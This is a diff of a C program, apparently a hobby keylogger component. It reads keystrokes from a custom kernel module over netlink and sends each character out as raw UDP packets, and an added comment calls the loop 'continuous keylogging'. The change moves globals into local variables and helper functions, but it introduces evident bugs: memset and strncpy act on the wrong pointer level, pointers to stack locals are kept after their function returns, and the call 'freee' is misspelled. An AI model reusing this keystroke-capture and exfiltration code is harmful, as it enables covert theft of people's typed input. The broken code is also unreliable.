@@ -1,26 +1,9 @@
 
-#include <sys/types.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <string.h>
-#include <asm/types.h>
-#include <linux/netlink.h>
-#include <linux/socket.h>
-#include <errno.h>
-#include "send_packet_raw_subodh.h"
+
+#include "kernel_reader.h"
 
 #define PORT 30		  // same customized protocol as in my kernel module
 #define MAX_PAYLOAD 3 // maximum payload size
-
-struct sockaddr_nl src_addr, dest_addr;
-struct nlmsghdr *nlh = NULL;
-struct nlmsghdr *nlh2 = NULL;
-struct msghdr msg, resp; // famous struct msghdr, it includes "struct iovec *   msg_iov;"
-struct iovec iov, iov2;
-int sock_fd;
 
 void get_eth_index()
 {
@@ -74,7 +57,7 @@ inline void set_data(char tav)
 {
 	sendbuff[total_len] = tav;
 	sendbuff[total_len + 1] = 0;
-}	
+}
 void get_udp(char data)
 {
 	//!	set udh to the correct position in the buffer by offsetting the ip and ether headers.
@@ -115,10 +98,7 @@ void get_ip()
 
 	printf("%s\n", inet_ntoa((((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr)));
 
-	/****** OR
-		int i;
-		for(i=0;i<14;i++)
-		printf("%d\n",(unsigned char)ifreq_ip.ifr_addr.sa_data[i]); ******/
+	
 	//! setup ip header in the buffer by offsetting the size of the ethernet header
 	struct iphdr *iph = (struct iphdr *)(sendbuff + sizeof(struct ethhdr));
 	//* size of iph header
@@ -153,9 +133,9 @@ void setup_sender()
 	memset(sendbuff, 0, 64);
 
 	get_eth_index(); // interface number
-	get_mac();
-	get_ip();
-	ready_to_send = 1;
+	get_mac();	// my mac adress
+	get_ip();	// my ip adress
+	ready_to_send = 1; // now send_char() will work
 }
 
 void send_char(char tav)
@@ -187,10 +167,12 @@ void send_char(char tav)
 		printf("call setup_sender first\n");
 	}
 }
-
-int main(int args, char *argv[])
+// open and bind the netlink socket that shall recieve and sent to the kernel
+// returns the new socket
+int netlink_open_and_bind()
 {
-	// int socket(int domain, int type, int protocol);
+	struct sockaddr_nl src_addr;
+	int sock_fd;
 	sock_fd = socket(PF_NETLINK, SOCK_RAW, PORT); // NETLINK_KOBJECT_UEVENT
 
 	if (sock_fd < 0)
@@ -209,6 +191,18 @@ int main(int args, char *argv[])
 		close(sock_fd);
 		return -1;
 	}
+	return sock_fd;
+}
+// setup various structs needed for netlink communication.
+// as the kernel cannot send data by itself whenever it wants, we shall ask the kernel for a message by sending our own message first,
+// and awaiting for a response. here we setup the pointers to the msgheaders that will store both the sent and the received message.
+// struct nlmsghdr *nlh/2 - header struct to setup - will be filled with request/response settings. also stores the actual message.
+// struct msghdr *msg/resp - header struct to setup - will be sent/received to/from the netlink
+// doesn't return anything
+void setup_msg_hdr(struct nlmsghdr **nlh2, struct nlmsghdr **nlh,struct msghdr *msg,struct msghdr *resp)
+{
+	struct sockaddr_nl dest_addr;
+	struct iovec iov, iov2;
 
 	memset(&dest_addr, 0, sizeof(dest_addr));
 	dest_addr.nl_family = AF_NETLINK;
@@ -218,32 +212,45 @@ int main(int args, char *argv[])
 	// nlh: contains "Hello" msg
 	nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
 	memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
-	nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
-	nlh->nlmsg_pid = getpid(); // self pid
-	nlh->nlmsg_flags = 0;
+	(*nlh)->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
+	(*nlh)->nlmsg_pid = getpid(); // self pid
+	(*nlh)->nlmsg_flags = 0;
 
 	// nlh2: contains received msg
-	nlh2 = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
+	*nlh2 = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
 	memset(nlh2, 0, NLMSG_SPACE(MAX_PAYLOAD));
-	nlh2->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
-	nlh2->nlmsg_pid = getpid(); // self pid
-	nlh2->nlmsg_flags = 0;
+	(*nlh2)->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
+	(*nlh2)->nlmsg_pid = getpid(); // self pid
+	(*nlh2)->nlmsg_flags = 0;
 
 	strncpy(NLMSG_DATA(nlh), "ok", 2); // put "Hello" msg into nlh
 
 	iov.iov_base = (void *)nlh; // iov -> nlh
-	iov.iov_len = nlh->nlmsg_len;
-	msg.msg_name = (void *)&dest_addr; // msg_name is Socket name: dest
-	msg.msg_namelen = sizeof(dest_addr);
-	msg.msg_iov = &iov; // msg -> iov
-	msg.msg_iovlen = 1;
+	iov.iov_len = (*nlh)->nlmsg_len;
+	(*msg).msg_name = (void *)&dest_addr; // msg_name is Socket name: dest
+	(*msg).msg_namelen = sizeof(dest_addr);
+	(*msg).msg_iov = &iov; // msg -> iov
+	(*msg).msg_iovlen = 1;
 
 	iov2.iov_base = (void *)nlh2; // iov -> nlh2
-	iov2.iov_len = nlh2->nlmsg_len;
-	resp.msg_name = (void *)&dest_addr; // msg_name is Socket name: dest
-	resp.msg_namelen = sizeof(dest_addr);
-	resp.msg_iov = &iov2; // resp -> iov
-	resp.msg_iovlen = 1;
+	iov2.iov_len = (*nlh2)->nlmsg_len;
+	(*resp).msg_name = (void *)&dest_addr; // msg_name is Socket name: dest
+	(*resp).msg_namelen = sizeof(dest_addr);
+	(*resp).msg_iov = &iov2; // resp -> iov
+	(*resp).msg_iovlen = 1;
+}
+int main(int args, char *argv[])
+{
+	struct nlmsghdr *nlh = NULL;
+	struct nlmsghdr *nlh2 = NULL;
+	struct msghdr msg, resp; // famous struct msghdr, it includes "struct iovec *   msg_iov;"
+	int sock_fd = netlink_open_and_bind();
+	if (sock_fd == -1)
+	{
+		exit(1);
+	}
+	// int socket(int domain, int type, int protocol);
+	setup_msg_hdr(&nlh2,&nlh,&msg,&resp);
 	int ret = sendmsg(sock_fd, &msg, 0);
 	printf("Waiting for message from kernel\n");
 	/* Read message from kernel */
@@ -251,7 +258,7 @@ int main(int args, char *argv[])
 	printf("key stroke: %s\n", (char *)NLMSG_DATA(nlh2));
 	setup_sender();
 	send_char(*(char *)NLMSG_DATA(nlh2));
-
+	// send-recv loop, allowing for continuous keylogging.
 	while (1)
 	{
 		strncpy(NLMSG_DATA(nlh), "ok", 2);
@@ -264,6 +271,8 @@ int main(int args, char *argv[])
 			total_len -= sizeof(struct udphdr);
 		}
 	}
+	free(nlh);
+	freee(nlh2);
 	close(sock_fd);
 	return 0;
 }
